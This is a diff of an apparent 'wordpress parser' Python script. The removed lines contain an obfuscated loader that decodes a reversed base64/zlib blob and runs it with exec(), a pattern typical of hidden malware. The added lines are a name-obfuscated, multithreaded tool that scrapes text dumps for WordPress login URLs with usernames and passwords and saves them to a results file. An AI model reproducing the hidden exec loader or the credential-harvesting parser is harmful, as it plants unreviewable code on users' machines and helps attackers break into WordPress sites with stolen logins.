@@ -1,4 +1,80 @@
-
-# alexithema wordpress parser
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+import os #line:1
+import re #line:2
+import threading #line:3
+import platform #line:4
+from colorama import init ,Fore #line:5
+init (autoreset =True )#line:7
+def parse_credentials (OO0OO000O00O00000 ,OOOO000OO000O00O0 ,O0OO0O00O0OO0O0O0 ,O000O0O00O0OOO0O0 ):#line:9
+    O0O0000O0OO0000OO =[r'(https?://[^\s]*wp-login\.php):([^\s:]+):([^\s:]+)',r'(https?://[^\s]*wp-login\.php)\|([^\s|]+)\|([^\s|]+)',r'(https?://[^\s]*wp-login\.php)#([^\s@]+)@([^\s@]+)',r'(https?://[^\s]*wp-login\.php)#([^\s@]+)@([^\s@]+)@([^\s@]+)',r'(https?://[^\s]*wp-login\.php)\s*:\s*([^\s:]+)\s*:\s*([^\s:]+)']#line:16
+    try :#line:18
+        with open (OO0OO000O00O00000 ,'r',encoding ='utf-8',errors ='ignore')as O0000OO000O0O0OO0 :#line:19
+            for OO0000000000OOOOO in O0000OO000O0O0OO0 :#line:20
+                for OOOO000OO000OOO00 in O0O0000O0OO0000OO :#line:21
+                    try :#line:22
+                        OOOOO00O0O00000OO =re .findall (OOOO000OO000OOO00 ,OO0000000000OOOOO ,re .IGNORECASE )#line:23
+                        for OOOOO0OOO0O0OO00O in OOOOO00O0O00000OO :#line:24
+                            OO0O0O0OO0OO0O0OO =OOOOO0OOO0O0OO00O [0 ]#line:25
+                            with O0OO0O00O0OO0O0O0 :#line:26
+                                if len (OOOOO0OOO0O0OO00O )==3 :#line:27
+                                    O0O0OOO000OO00000 =f"{OO0O0O0OO0OO0O0OO}|{OOOOO0OOO0O0OO00O[1]}|{OOOOO0OOO0O0OO00O[2]}"#line:28
+                                elif len (OOOOO0OOO0O0OO00O )==4 :#line:29
+                                    O0O0OOO000OO00000 =f"{OO0O0O0OO0OO0O0OO}|{OOOOO0OOO0O0OO00O[1]}|{OOOOO0OOO0O0OO00O[2]}@{OOOOO0OOO0O0OO00O[3]}"#line:30
+                                if O0O0OOO000OO00000 not in OOOO000OO000O00O0 :#line:31
+                                    OOOO000OO000O00O0 .add (O0O0OOO000OO00000 )#line:32
+                                    print (f"{Fore.YELLOW}[ {Fore.RESET}Found {Fore.YELLOW}]{Fore.RESET} {O0O0OOO000OO00000} {Fore.RESET}| {Fore.GREEN}[ FOUND ]{Fore.RESET}")#line:33
+                                    with open (O000O0O00O0OOO0O0 ,'a',encoding ='utf-8')as O000OO0OOO0OOO0OO :#line:34
+                                        O000OO0OOO0OOO0OO .write (O0O0OOO000OO00000 +'\n')#line:35
+                    except re .error as OOOO00OOOOO000OO0 :#line:36
+                        print (f"{Fore.RED}[!] Regex error in {OO0OO000O00O00000} for pattern {OOOO000OO000OOO00}: {OOOO00OOOOO000OO0}{Fore.RESET}")#line:37
+    except Exception as O0O0O00OO0000O0OO :#line:38
+        print (f"{Fore.RED}[!] Error reading {OO0OO000O00O00000}: {O0O0O00OO0000O0OO}{Fore.RESET}")#line:39
+def extract_credentials_from_folder (O00OO000OO0OO0OO0 ,OOOO0OO000OO0O0OO ,OOOO0OOO0OOO000O0 ):#line:41
+    open (OOOO0OO000OO0O0OO ,'w',encoding ='utf-8').close ()#line:42
+    OOO00OO0OOOO00000 =set ()#line:43
+    O00OO0O00000OOOO0 =threading .Lock ()#line:44
+    OOO00O00000O00O0O =[]#line:45
+    OOOO0O00O00O0O0OO =[O0OO000OO00O0OOOO for O0OO000OO00O0OOOO in os .listdir (O00OO000OO0OO0OO0 )if O0OO000OO00O0OOOO .endswith ('.txt')]#line:46
+    if not OOOO0O00O00O0O0OO :#line:48
+        print (f"{Fore.RED}[!] Tidak ada file .txt di {O00OO000OO0OO0OO0}.{Fore.RESET}")#line:49
+        return #line:50
+    def OOO00OO0O0O00OO00 ():#line:52
+        while OOOO0O00O00O0O0OO :#line:53
+            O0OOOOOOOO0O0000O =OOOO0O00O00O0O0OO .pop ()#line:54
+            OOO00OO0O000OO0OO =os .path .join (O00OO000OO0OO0OO0 ,O0OOOOOOOO0O0000O )#line:55
+            print (f"{Fore.CYAN}[*] Memproses {OOO00OO0O000OO0OO}...{Fore.RESET}")#line:56
+            parse_credentials (OOO00OO0O000OO0OO ,OOO00OO0OOOO00000 ,O00OO0O00000OOOO0 ,OOOO0OO000OO0O0OO )#line:57
+    for _O00O0OO0O0OOO0O0O in range (min (OOOO0OOO0OOO000O0 ,len (OOOO0O00O00O0O0OO ))):#line:59
+        O0OO000OO0OO0O000 =threading .Thread (target =OOO00OO0O0O00OO00 )#line:60
+        OOO00O00000O00O0O .append (O0OO000OO0OO0O000 )#line:61
+        O0OO000OO0OO0O000 .start ()#line:62
+    for O0OO000OO0OO0O000 in OOO00O00000O00O0O :#line:64
+        O0OO000OO0OO0O000 .join ()#line:65
+    print (f"{Fore.GREEN}Extraction complete. {len(OOO00OO0OOOO00000)} credentials saved to {OOOO0OO000OO0O0OO}{Fore.RESET}")#line:67
+def main ():#line:69
+    if platform .system ()=="Windows":#line:70
+        os .system ('cls')#line:71
+    else :#line:72
+        os .system ('clear')#line:73
+    print (f"""
+{Fore.YELLOW}
+ ██████╗ ██╗  ██╗███████╗ █████╗ ██╗     ███████╗██╗  ██╗██╗████████╗██╗  ██╗███████╗███╗   ███╗ █████╗ 
+██╔═══██╗╚██╗██╔╝╚════██║██╔══██╗██║     ██╔════╝╚██╗██╔╝██║╚══██╔══╝██║  ██║██╔════╝████╗ ████║██╔══██╗
+██║   ██║ ╚███╔╝    ██╔╝ ███████║██║     █████╗   ╚███╔╝ ██║   ██║   ███████║█████╗  ██╔████╔██║███████║
+██║   ██║ ██╔██╗   ██╔╝  ██╔══██║██║     ██╔══╝   ██╔██╗ ██║   ██║   ██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║
+╚██████╔╝██╔╝ ██╗  ██║   ██║  ██║███████╗███████╗██╔╝ ██╗██║   ██║   ██║  ██║███████╗██║ ╚═╝ ██║██║  ██║
+ ╚═════╝ ╚═╝  ╚═╝  ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝
+{Fore.RESET}
+    """)#line:84
+    O0000O00O00OOOOO0 =input ("Masukkan directory yang berisi .txt: ")#line:86
+    O0OO00O000000O000 =input ("Masukkan nama result (example: result.txt): ")#line:87
+    OO0000OO0O0O0O0OO =int (input ("Masukkan jumlah threads: "))#line:88
+    OOOOOO0OOO00O0O00 =input ("Mamulakan scan! Adakah kamu mau melanjutkan? (y/n): ").strip ().lower ()#line:89
+    if OOOOOO0OOO00O0O00 !='y':#line:91
+        print (f"{Fore.RED}Scan dibatalkan.{Fore.RESET}")#line:92
+        return #line:93
+    if not os .path .isdir (O0000O00O00OOOOO0 ):#line:95
+        print (f"{Fore.RED}[!] Directory {O0000O00O00OOOOO0} tidak valid.{Fore.RESET}")#line:96
+        return #line:97
+    extract_credentials_from_folder (O0000O00O00OOOOO0 ,O0OO00O000000O000 ,OO0000OO0O0O0O0OO )#line:99
+if __name__ =="__main__":#line:101
+    main ()
